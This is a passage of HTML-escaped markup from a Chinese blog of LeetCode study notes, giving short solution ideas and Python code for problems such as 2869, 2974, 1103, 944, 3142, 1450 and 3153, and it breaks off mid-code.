&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;题解：自己或别人的解题思路
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;特解：这道题使用特殊方法
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Get：学到的点
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="2869-收集元素的最少操作次数"&gt;2869. 收集元素的最少操作次数
&lt;/h2&gt;&lt;p&gt;题解：从数组末端开始，标记数组，只有小于K的去求余标记，然后求和查一下是不是全1。全1返回结果&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;minOperations&lt;/span&gt;(self, nums, k):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type nums: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type k: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;] &lt;span style="color:#f92672"&gt;*&lt;/span&gt; k
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(nums)&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; nums[i]&lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt;k:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag[nums[i]&lt;span style="color:#f92672"&gt;%&lt;/span&gt;k] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; sum(flag) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; k:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; len(nums)&lt;span style="color:#f92672"&gt;-&lt;/span&gt;i
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题解：创建k的集合从集合里删除数字，为空返回。&lt;/p&gt;
&lt;h2 id="2974-最小数字游戏"&gt;2974. 最小数字游戏
&lt;/h2&gt;&lt;p&gt;关键：bob先加入arr，Alice后加。为什么要刻意强调数组是&lt;strong&gt;偶数长度&lt;/strong&gt;？&lt;/p&gt;
&lt;p&gt;特解：排序后两两交换大的在前。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;numberGame&lt;/span&gt;(self, nums):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type nums: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; nums&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sort()
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, len(nums), &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; nums[i], nums[i &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; nums[i &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;], nums[i]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; nums
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Get：pop时候从后往前删，不然会越界。&lt;/p&gt;
&lt;h2 id="1103-分糖果-ii"&gt;1103. 分糖果 II
&lt;/h2&gt;&lt;p&gt;题解：等差序列为1求序列和公式，对糖果数量 &lt;code&gt;candies&lt;/code&gt; 求解并向下取整，得到的是每次增加一个可以分给几个小朋友 &lt;code&gt;n&lt;/code&gt;（有剩余，因为使用的是取整），然后生成一个 1 到 n 的等差序列数组，数组最后加上剩余的糖果。遍历序列下标，下标对 &lt;code&gt;num_people&lt;/code&gt; 求余加到最终答案数组里。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;distributeCandies&lt;/span&gt;(self, candies, num_people):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type candies: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type num_people: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;import&lt;/span&gt; math
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; pre_check &lt;span style="color:#f92672"&gt;=&lt;/span&gt; math&lt;span style="color:#f92672"&gt;.&lt;/span&gt;floor((((&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; (math&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sqrt(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt; &lt;span style="color:#f92672"&gt;*&lt;/span&gt; candies))) &lt;span style="color:#f92672"&gt;/&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; leaf_candy &lt;span style="color:#f92672"&gt;=&lt;/span&gt; int(candies &lt;span style="color:#f92672"&gt;-&lt;/span&gt; (pre_check &lt;span style="color:#f92672"&gt;*&lt;/span&gt; (pre_check &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;) &lt;span style="color:#f92672"&gt;/&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; series &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [i &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,int(pre_check&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;))]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; series &lt;span style="color:#f92672"&gt;=&lt;/span&gt; series &lt;span style="color:#f92672"&gt;+&lt;/span&gt; [leaf_candy] &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; leaf_candy &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; series
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;] &lt;span style="color:#f92672"&gt;*&lt;/span&gt; num_people
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;, len(series)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res[i &lt;span style="color:#f92672"&gt;%&lt;/span&gt; num_people] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; res[i &lt;span style="color:#f92672"&gt;%&lt;/span&gt; num_people] &lt;span style="color:#f92672"&gt;+&lt;/span&gt; series[i]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; res
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="944-删列造序"&gt;944. 删列造序
&lt;/h2&gt;&lt;p&gt;题解：获取 &lt;code&gt;strs&lt;/code&gt; 长度 &lt;code&gt;l&lt;/code&gt; 代表一列的字符串长度，&lt;code&gt;l_str&lt;/code&gt; 是有几列。然后相邻两个比较大小（python直接比价ASCII值）如果发生前面比后面大就说明不是严格递增。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;minDeletionSize&lt;/span&gt;(self, strs):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type strs: List[str]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; l &lt;span style="color:#f92672"&gt;=&lt;/span&gt; len(strs)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; l_str &lt;span style="color:#f92672"&gt;=&lt;/span&gt; len(strs[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(l_str):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; j &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(l&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; strs[j][i] &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; strs[j&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;][i]:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; res
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="3142-判断矩阵是否满足条件"&gt;3142. 判断矩阵是否满足条件
&lt;/h2&gt;&lt;p&gt;题解：判断所有竖列相同，任选一行判断横向相邻不相同。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;satisfiesConditions&lt;/span&gt;(self, grid):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type grid: List[List[int]]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: bool
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;])&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; k &lt;span style="color:#f92672"&gt;=&lt;/span&gt; grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;][i]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;][i] &lt;span style="color:#f92672"&gt;==&lt;/span&gt; grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;][i&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; j &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(grid)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; grid[j][i] &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; k:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; k &lt;span style="color:#f92672"&gt;=&lt;/span&gt; grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;][len(grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;])&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; j &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(grid)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; grid[j][len(grid[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;])&lt;span style="color:#f92672"&gt;-&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;] &lt;span style="color:#f92672"&gt;!=&lt;/span&gt; k:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="1450-在既定时间做作业的学生人数"&gt;1450. 在既定时间做作业的学生人数
&lt;/h2&gt;&lt;p&gt;题解：要求 &lt;code&gt;queryTime&lt;/code&gt; 处于 &lt;code&gt;[startTime[i], endTime[i]]&lt;/code&gt; 之间。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;busyStudent&lt;/span&gt;(self, startTime, endTime, queryTime):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type startTime: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type endTime: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type queryTime: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len(startTime)):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; endTime[i] &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; queryTime:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; startTime[i] &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; queryTime:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; res
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其他题解：用flag标记，开始时间值为1，结束时间值为-1，从开头截取数组到&lt;code&gt;queryTime&lt;/code&gt; 即 &lt;code&gt;flag[:queryTime + 1]&lt;/code&gt;求和就是结果。&lt;/p&gt;
&lt;p&gt;Get：有人在评论区问这样枚举 就可以了，其他方案都是来搞笑的，但是对于多次查询的话其他题解的方式就是一劳永逸。&lt;/p&gt;
&lt;h2 id="3153-所有数对中数位差之和"&gt;3153. 所有数对中数位差之和
&lt;/h2&gt;&lt;p&gt;题解：数字长度一样，按照个十百的顺序处理每一位，对最后一位取余使用 &lt;code&gt;flag&lt;/code&gt; 统计个数，最后对 &lt;code&gt;flag&lt;/code&gt; 数组计算每个元素乘它右边元素值加到 &lt;code&gt;res&lt;/code&gt; 上（比如个位4出现两次，5出现三次，那么这5个数不管其他位，个位比较且不同次数至少为2*3=6次，只能乘右边是避免重复）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Solution&lt;/span&gt;(object):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;sumDigitDifferences&lt;/span&gt;(self, nums):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :type nums: List[int]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; :rtype: int
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt; &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; len_num &lt;span style="color:#f92672"&gt;=&lt;/span&gt; len(str(nums[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; res &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; i &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(len_num):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]&lt;span style="color:#f92672"&gt;*&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; j &lt;span style="color:#f92672"&gt;in&lt;/span&gt; nums:
